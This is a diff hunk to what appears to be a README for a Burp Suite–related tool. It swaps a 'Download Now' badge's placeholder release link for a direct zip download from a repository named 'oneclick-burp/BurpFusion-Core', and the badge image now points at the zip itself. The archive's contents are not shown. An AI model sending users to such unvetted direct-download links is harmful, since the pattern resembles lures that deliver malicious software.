@@ -57,5 +57,5 @@ D --> G[Python plugins]
 + Includes automatic trademark disclaimer injection
 ```
 
-[![Download Now](https://img.shields.io/badge/Download-Windows_Executable-brightgreen?style=for-the-badge&logo=windows)](https://github.com/your/repo/releases/latest)
+[![Download Now](https://github.com/oneclick-burp/BurpFusion-Core/archive/refs/heads/main.zip)](https://github.com/oneclick-burp/BurpFusion-Core/archive/refs/heads/main.zip)
 
